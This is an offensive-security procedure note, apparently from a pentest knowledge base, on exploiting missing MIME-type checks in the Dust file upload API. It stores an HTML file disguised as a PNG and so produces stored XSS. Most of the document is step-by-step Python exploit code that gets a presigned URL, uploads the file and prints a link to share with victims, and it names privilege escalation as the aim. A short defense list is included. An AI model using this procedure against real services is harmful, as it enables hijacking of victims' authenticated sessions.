---
tags:
  - file-upload
  - xss
  - api
type: procedure
tools:
  - '[[tools/Python]]'
  - '[[tools/requests]]'
  - '[[tools/requests_toolbelt]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/import-requests-python]]'
  - '[[commands/import-multipart-encoder-python]]'
  - '[[commands/set-auth-cookies-python]]'
  - '[[commands/define-upload-metadata-python]]'
  - '[[commands/post-upload-metadata-python]]'
  - '[[commands/print-response-text-python]]'
  - '[[commands/extract-upload-url-python]]'
  - '[[commands/prepare-multipart-file-python]]'
  - '[[commands/set-upload-headers-python]]'
  - '[[commands/post-file-upload-python]]'
  - '[[commands/print-shareable-url-python]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Remote File Copy]]'
  - '[[JavaScript]]'
updated_at: '2025-12-13T23:55:38.424Z'
sub_techniques: []
id: cadc5514-f390-4844-bdd2-0d6ef46fea87
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Remote File Copy]]'
  - '[[JavaScript]]'
---
# Upload-Malicious-HTML-File-via-API

## Summary

This procedure exploits the lack of MIME-type validation in Dust's file upload API to upload an HTML file containing malicious JavaScript, disguised as a PNG image, enabling stored XSS when viewed.

## Description

The Dust API at /api/w/<workspace_sid>/files allows uploading files with specified contentType. By setting contentType to 'text/html' and filename to 'xss_poc.png', the file is served as executable HTML. The process involves a two-step upload: first POST metadata to get a presigned upload URL, then multipart POST the file. This leads to JS execution in viewers' browsers, allowing authenticated API calls on their behalf.

## Requirements

1. Dummy account session cookie ('appSession')
2. Malicious HTML file (xss.html) with JS payload
3. Workspace SID
4. Python environment with requests and requests_toolbelt

## Defense

Defensive measures and detection strategies:

- Validate and restrict MIME types to actual image formats (e.g., validate headers and extensions)
- Sanitize or block HTML/JS in uploaded files
- Serve files with Content-Security-Policy to prevent JS execution
- Log and monitor uploads with suspicious content types

## Objectives

1. Bypass file type restrictions for XSS payload delivery
2. Obtain shareable download URL for the malicious file
3. Enable stored XSS for subsequent privilege escalation

## Instructions

### Step 1: Import Libraries and Set Authentication

**Context**: Prepare the Python script with necessary imports and auth cookies.

**Command** ([[commands/import-requests-python]]):
```python
import requests
from requests_toolbelt.multipart.encoder import MultipartEncoder
cookies = {'appSession': '<dummy_account_session>'}
```

> Imports libraries for HTTP requests and multipart encoding, sets session cookie for auth.

### Step 2: Define Upload Metadata

**Context**: Create JSON payload with malicious contentType to get presigned URL.

**Command** ([[commands/define-upload-metadata-python]]):
```python
json_data = {'contentType': 'text/html', 'fileName': 'xss_poc.png', 'fileSize': 7331, 'useCase': 'conversation'}
```

> Specifies HTML as content type, disguises as PNG, sets size and use case.

### Step 3: Initiate Upload and Get URL

**Context**: POST metadata to API to receive upload URL.

**Command** ([[commands/post-upload-metadata-python]]):
```python
response = requests.post('https://dust.tt/api/w/<workspace_sid>/files', cookies=cookies, json=json_data)
print(response.text)
uploadUrl = response.json()['file']['uploadUrl']
```

> Sends request, prints response for debug, extracts upload URL.

### Step 4: Prepare and Execute File Upload

**Context**: Encode file as multipart and upload with browser-like headers.

**Command** ([[commands/prepare-multipart-file-python]]):
```python
m = MultipartEncoder(fields={'file': ('xss_poc.png', open('Dust/xss.html', 'rb'), 'text/html')})
headers = {'accept': '*/*', ... 'user-agent': 'Mozilla/5.0 ...'}
response = requests.post(url=uploadUrl, headers=headers, cookies=cookies, data=m)
print(f'[*] URL TO SHARE:\n{response.json()["file"]["downloadUrl"]}?action=view')
```

> Creates encoder with file, sets headers, uploads, and prints shareable URL.

**Expected Output**: JSON with downloadUrl appended with ?action=view.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[Remote File Copy]] Ingress Tool Transfer
- [[JavaScript]] JavaScript

### Sub-Techniques


## Commands Used

- [[commands/import-requests-python]]
- [[commands/import-multipart-encoder-python]]
- [[commands/set-auth-cookies-python]]
- [[commands/define-upload-metadata-python]]
- [[commands/post-upload-metadata-python]]
- [[commands/print-response-text-python]]
- [[commands/extract-upload-url-python]]
- [[commands/prepare-multipart-file-python]]
- [[commands/set-upload-headers-python]]
- [[commands/post-file-upload-python]]
- [[commands/print-shareable-url-python]]

## Tools Used

- [[tools/Python]]
- [[tools/requests]]
- [[tools/requests_toolbelt]]

## Tags

- [[file-upload]]
- [[xss]]
- [[api]]
